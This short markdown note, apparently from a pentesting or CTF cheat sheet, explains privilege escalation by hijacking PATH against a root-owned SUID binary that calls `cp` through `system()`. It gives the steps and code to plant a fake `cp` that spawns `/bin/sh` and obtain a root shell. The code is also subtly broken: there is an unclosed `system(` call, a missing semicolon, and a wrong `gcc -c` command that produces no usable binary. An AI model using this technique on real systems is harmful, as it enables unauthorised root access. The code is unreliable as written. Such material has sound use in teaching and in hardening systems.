### SUID + PATH = Privilege Escalation
**Scenario**
A binary called `copy-to-root`, owned by root with the SUID bit set, calls `system(cp argv[1] /root/` to copy files to `/root/`.

**Exploitation**
- Create a `/tmp/cp.c` file and add the following code:
	```bash
	# include <stdlib.h>
	int main(){
	system("/bin/sh")
	}
```

- Compile it
	```bash
	gcc -c /tmp/cp /tmp/cp.c 
```
	- /tmp/cp.c - input (C source file)
	- /tmp/cp - output (compiled binary)

- Add /tmp to the PATH variable
	```bash
	export PATH=/tmp:$PATH
```

- Run the vulnerable binary
	```bash
	./copy-to-root
```

This will cause the `copy-to-root` binary to call `cp` from PATH, effectively spawning a root shell.